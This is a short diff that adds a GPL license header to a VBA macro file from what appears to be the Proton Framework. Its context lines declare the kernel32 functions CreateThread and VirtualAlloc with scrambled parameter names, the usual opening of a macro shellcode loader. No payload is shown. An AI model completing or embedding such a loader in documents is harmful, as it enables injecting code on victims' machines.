@@ -1,3 +1,21 @@
+'            ---------------------------------------------------
+'                             Proton Framework              
+'            ---------------------------------------------------
+'                Copyright (C) <2019-2020>  <Entynetproject>
+'
+'        This program is free software: you can redistribute it and/or modify
+'        it under the terms of the GNU General Public License as published by
+'        the Free Software Foundation, either version 3 of the License, or
+'        any later version.
+'
+'        This program is distributed in the hope that it will be useful,
+'        but WITHOUT ANY WARRANTY; without even the implied warranty of
+'        MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
+'        GNU General Public License for more details.
+'
+'        You should have received a copy of the GNU General Public License
+'        along with this program.  If not, see <http://www.gnu.org/licenses/>.
+
 #If Vba7 Then
     Private Declare PtrSafe Function CreateThread Lib "kernel32" (ByVal Zopqv As Long, ByVal Xhxi As Long, ByVal Mqnynfb As LongPtr, Tfe As Long, ByVal Zukax As Long, Rlere As Long) As LongPtr
     Private Declare PtrSafe Function VirtualAlloc Lib "kernel32" (ByVal Xwl As Long, ByVal Sstjltuas As Long, ByVal Bnyltjw As Long, ByVal Rso As Long) As LongPtr
